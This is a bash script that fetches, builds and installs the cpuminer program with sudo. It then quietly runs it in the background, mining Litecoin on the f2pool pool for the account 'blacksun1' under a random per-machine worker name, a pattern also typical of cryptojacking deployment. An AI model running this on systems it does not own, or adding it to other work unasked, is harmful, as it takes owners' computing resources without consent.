#!/bin/bash 
if [ ! -f "./pooler-cpuminer-2.5.0.tar.gz" ];then 
	wget https://github.com/pooler/cpuminer/releases/download/v2.5.0/pooler-cpuminer-2.5.0.tar.gz 	
	sudo apt-get install libcurl4-openssl-dev -y > /dev/null 2>&1
fi 
worker_id=$(head -1 /dev/random |cksum |awk '{print $1}')
if [ "$?" -eq 0 ];then 
	tar zxvf pooler-cpuminer-2.5.0.tar.gz 
	cd ./cpuminer-2.5.0
	./configure && make && sudo make install
	if [ "$?" -eq 0 ];then 
			pid=$(nohup minerd -o stratum+tcp://ltc.f2pool.com:8888 -O blacksun1."$worker_id":123 > minerd.log 2>&1 &)
		echo "$pid"
	fi 
fi 

